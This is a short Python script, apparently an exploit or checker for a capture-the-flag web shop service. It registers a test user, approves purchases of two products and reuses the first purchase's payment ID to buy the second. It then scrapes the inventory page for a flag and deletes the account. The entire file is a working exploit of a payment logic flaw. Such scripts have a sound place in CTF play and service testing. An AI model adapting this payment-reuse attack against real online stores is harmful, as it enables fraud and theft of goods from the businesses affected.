import sys
from webbrowser import get
import requests
from bs4 import BeautifulSoup

host = sys.argv[1]
port = sys.argv[2]    

def exploit():
    username = "checker_test1337"
    session = requests.Session()
    session.post(f"http://{host}:{port}/",data={"login": username, "passwd": "q", "action": "signup", "card": ""})
    session.post(f"http://{host}:{port}", data={"login": username, "passwd": "q", "action": "signin", "card": ""})

    r = session.post(f"http://{host}:{port}/approve?product_id=1", data={"buy": "yes", "tag": "checker_tag"})
    payment_id = r.url.partition('=')[2]
    print(r.text)
    print(r.url)
    print(payment_id)
    r = session.post(f"http://{host}:{port}/approve?product_id=3", data={"buy": "yes", "tag": "checker_tag"})
    r = session.get(f"http://{host}:{port}/buy?payment_id={payment_id}")
    

    r = session.get(f"http://{host}:{port}/inventory")
    soup = BeautifulSoup(r.text, "html.parser")
    req = soup.find("p", class_="flag")
    session.get(f"http://{host}:{port}/delete")
    
    if req.text:
        return 1
    else: return 0


if __name__ == '__main__':
    print(exploit())